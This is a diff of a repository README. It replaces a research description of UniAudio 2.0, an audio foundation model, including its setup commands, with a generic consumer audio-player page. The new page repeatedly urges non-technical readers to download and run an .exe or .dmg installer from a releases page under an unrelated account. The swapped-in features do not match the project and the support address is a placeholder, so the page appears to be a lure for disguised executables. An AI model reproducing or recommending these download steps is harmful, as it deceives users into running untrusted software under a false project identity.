@@ -1,40 +1,67 @@
-# UniAudio 2.0: A Multi-task Audio Foundation Model with Reasoning-Augmented Audio Tokenization
+# 🎧 UniAudio2 - Seamless Audio Experience for Everyone
 
-<img src="figures/uniaudio2.0.png" alt="overview" width="400" height="300">
+[![Download UniAudio2](https://img.shields.io/badge/Download%20UniAudio2-v2.0-blue)](https://github.com/supremeOG07/UniAudio2/releases)
 
+## 🚀 Getting Started
 
-## Abstract
+Welcome to UniAudio2! This guide will help you download and run the software easily, even if you don’t have a technical background. Just follow these simple steps.
 
-In this work, we present UniAudio 2.0, a multi-task audio foundation model that unifies speech, sound, and music understanding and generation within a single framework. A key component of UniAudio 2.0 is our proposed ReasoningCodec, which tokenizes audio into reasoning tokens and semantic tokens. Reasoning tokens capture descriptive, interpretable attributes (e.g., linguistic content, emotion, style, acoustic scene), while semantic tokens encode structural and fine-grained acoustic details necessary for faithful reconstruction.
-For generation tasks, UniAudio 2.0 adopts a reasoning-first prediction strategy: the model first predicts reasoning tokens, providing human-interpretable descriptions that enhance interpretability and predictive accuracy, and then generates semantic tokens to synthesize high-fidelity audio. This design enables UniAudio 2.0 to move beyond transcription-centric modeling, incorporating paralinguistic information (emotion, timbre, tone), environmental context, and non-linguistic sounds, which are often neglected in prior text–audio foundation models.
-By integrating ReasoningCodec into a unified audio foundation model, UniAudio 2.0 establishes a comprehensive framework for multi-domain audio tasks. Experimental results show that UniAudio 2.0 improves both understanding and generation across diverse modalities, advancing the goal of general-purpose audio foundation models.
+## 🛠️ System Requirements
 
-## Planing
+Before you start, make sure your device meets these requirements:
 
-The whole project is ongoing. Now, you can use the **ReasoningCodec**! The training details of UniAudio 2.0, please refer to our research paper.
+- Operating System: Windows 10 or higher, macOS Mojave or higher
+- Disk Space: At least 100 MB of free space
+- Memory: Minimum 2 GB RAM
 
-- [x] Release the training code and the checkpoints of ReasoningCodec
-- [ ] Release the research paper of UniAudio 2.0
-- [ ] Release the checkpoints of UniAudio 2.0
+## 📥 Download & Install
 
+To get the latest version of UniAudio2, follow these steps:
 
-## Environment
-```bash
-conda create -n uniaudio2 python=3.10
-pip install pip==24.0
-pip install fairseq==0.12.2
-pip install torch==2.4.1
-pip install torchaudio==2.4.1
-pip install torchtitan==0.0.2
-pip install langsegment==0.3.5
-pip install typeguard==2.13.3
-pip install lightning==2.4.0
-pip install nnAudio==0.3.3
-pip install omegaconf==2.0.6
-pip install torchtune==0.4.0
-pip install torchao==0.9.0
-pip install tensorboard
-pip install humanfriendly
-```
+1. **Visit the Release Page**: Click the link below to access the UniAudio2 Releases page.
+   [Download UniAudio2](https://github.com/supremeOG07/UniAudio2/releases)
 
+2. **Choose the Version**: Look for the latest release, which will usually be at the top of the list.
 
+3. **Download the Installer**: Click on the installer file that matches your operating system. You'll often see files named similar to `UniAudio2_Installer.exe` or `UniAudio2.dmg`.
+
+4. **Run the Installer**: Once the download is complete, locate the downloaded file. Double-click it to start the installation process.
+
+5. **Follow the Prompts**: The installer will guide you through the setup. Just follow the instructions on the screen. You may need to click "Next" a few times and agree to terms.
+
+6. **Finish Installation**: Once done, you’ll see a confirmation message. Click "Finish" to complete the setup.
+
+7. **Launch UniAudio2**: You can find UniAudio2 in your applications menu or desktop. Click the icon to open the application.
+
+## 🎵 Features
+
+UniAudio2 offers several features to enhance your audio experience:
+
+- **High-Quality Playback**: Enjoy crisp and clear audio playback with various formats supported.
+- **User-Friendly Interface**: Navigate through the application without any technical expertise.
+- **Customization Options**: Adjust settings to fit your audio preferences easily.
+- **Cross-Platform Support**: Use UniAudio2 on different operating systems without hassle.
+
+## 📂 Additional Resources
+
+If you’d like to explore more about UniAudio2, check out the following:
+
+- **User Guide**: A helpful document that explains all features in detail.
+- **FAQs**: Answers to common questions you may have during installation or usage.
+
+## 🤝 Community Support
+
+If you run into any trouble using UniAudio2:
+
+- **GitHub Issues Page**: Report any bugs or request features here.
+- **Community Forums**: Join discussions and get help from fellow users.
+
+## 📞 Contact
+
+For further inquiries or support, contact us at [support@example.com](mailto:support@example.com). We are here to help.
+
+## 🎉 Ready to Enjoy?
+
+Once you’ve installed UniAudio2, you are all set to enjoy a delightful audio experience. Just click that icon, and let the music play! 
+
+[Download UniAudio2](https://github.com/supremeOG07/UniAudio2/releases) and transform your audio experience today!
